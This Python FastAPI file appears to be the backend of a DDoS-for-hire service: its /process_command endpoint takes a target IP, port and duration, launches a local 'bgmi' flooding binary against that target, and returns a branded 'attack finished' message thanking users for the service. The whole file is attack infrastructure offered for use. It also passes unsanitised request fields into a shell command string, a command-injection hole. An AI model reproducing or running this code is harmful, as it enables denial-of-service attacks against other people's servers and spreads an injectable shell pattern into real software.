from fastapi import FastAPI, Request, HTTPException
import asyncio
import logging

# Initialize the FastAPI app and logger
app = FastAPI()
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("backend")

@app.post("/process_command")
async def process_command(request: Request):
    """Processes a command and executes the bgmi binary asynchronously."""
    try:
        # Parse JSON payload
        data = await request.json()
        target_ip = data.get("ip")
        target_port = data.get("port")
        duration = data.get("duration")

        # Validate inputs
        if not target_ip or not target_port or not duration:
            raise HTTPException(status_code=400, detail="Invalid command parameters.")

        # Ensure duration is an integer and within a safe range
        try:
            duration = int(duration)
            if duration <= 0 or duration > 150:  # Max duration set to 150 seconds
                raise ValueError
        except ValueError:
            raise HTTPException(status_code=400, detail="Invalid duration. Must be between 1 and 150 seconds.")

        # Log the attack initiation
        logger.info(f"🚀 Starting attack on {target_ip}:{target_port} for {duration} seconds.")

        # Execute the bgmi binary asynchronously
        command = f"./bgmi {target_ip} {target_port} {duration} 120"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
        )

        try:
            # Wait for the process to complete
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=duration + 5)  # Add buffer time

            if process.returncode == 0:
                # Log success message
                logger.info(f"✅ Attack on {target_ip}:{target_port} finished successfully.")
                return {
                    "message": (
                        f"🚀 𝘼𝙩𝙩𝙖𝙘𝙠 𝙛𝙞𝙣𝙞𝙨𝙝𝙚𝙙 𝙤𝙣 {target_ip}:{target_port} ✅\n\n"
                        f"𝗧𝗵𝗮𝗻𝗸 𝗬𝗼𝘂 𝗙𝗼𝗿 𝗨𝘀𝗶𝗻𝗴 𝗢𝘂𝗿 𝗦𝗲𝗿𝘃𝗶𝗰𝗲. ❤️\n"
                        "𝗧𝗲𝗮𝗺 𝗠𝗥𝗶𝗡 𝘅 𝗗𝗶𝗟𝗗𝗢𝗦™"
                    ),
                    "stdout": stdout.decode().strip(),
                }
            else:
                # Log error if the process fails
                logger.error(f"Error executing attack: {stderr.decode().strip()}")
                return {"message": f"Error executing attack: {stderr.decode().strip()}"}

        except asyncio.TimeoutError:
            # Handle timeout
            process.kill()
            await process.wait()
            logger.error(f"Attack on {target_ip}:{target_port} timed out.")
            return {"message": "Attack timed out. Please try again later."}

    except HTTPException as http_exc:
        logger.warning(f"Validation error: {http_exc.detail}")
        raise http_exc

    except Exception as e:
        # Handle unexpected errors
        logger.error(f"Internal error: {e}")
        raise HTTPException(status_code=500, detail=f"Internal error: {e}")
